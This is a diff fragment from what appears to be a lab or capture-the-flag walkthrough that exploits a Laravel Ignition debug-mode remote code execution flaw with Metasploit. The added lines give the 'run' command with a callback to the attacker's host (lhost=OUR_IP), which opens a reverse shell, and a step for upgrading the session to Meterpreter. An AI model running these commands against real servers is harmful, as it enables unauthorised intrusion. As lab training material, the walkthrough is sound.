@@ -147,6 +147,12 @@ msf6 exploit(multi/php/ignition_laravel_debug_rce) > check rhost=10.10.40.65 Htt
 
 [//]: Set `HttpClientTimeout=20` or check may fail. If the connection is really slow/unstable, you may need a higher value.
 
-Now that we now that the target is vulnerable, lets 
+Now that we know that the target is vulnerable, let's pwn it.
+```Metasploit Commands
+run rhost=10.10.40.65 lhost=OUR_IP HttpClientTimeout=20
 ```
+
+To upgrade the session to Meterpreter, use the `sessions -u -1` command.
+```Metasploit
+
 ```
